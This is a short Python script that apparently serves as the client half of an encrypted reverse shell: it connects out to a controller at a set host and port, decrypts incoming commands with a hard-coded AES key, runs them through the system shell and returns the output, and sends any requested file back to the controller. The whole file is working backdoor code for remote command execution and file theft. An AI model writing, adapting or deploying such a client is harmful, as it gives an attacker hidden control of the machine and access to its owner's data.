#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import subprocess
import sys

from Crypto import Random
from Crypto.Cipher import AES

HOST = 'localhost'
PORT = 1337
KEY  = '82e672ae054aa4de6f042c888111686a'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"


def pad(s):
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)


def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)


def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')


def main():
    s = socket.socket()
    s.connect((HOST, PORT))

    while True:
        data = s.recv(1024)
        data = decrypt(data).split()

        # seperate data into command and action
        cmd, action = data[0], ' '.join(data[1:])

        # allow no action
        if action == []:
            action = ''

        # stop client
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # run command
        elif cmd == 'run':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(encrypt(results))

        # send file
        elif cmd == 'download':
            f_name = action.split()[0]

            f = open(f_name, 'rb')
            results = f.read(1024)
            while True:
                s.send(encrypt(results))
                results = f.read(1024)
                if results == '':
                    break


if __name__ == '__main__':
    main()
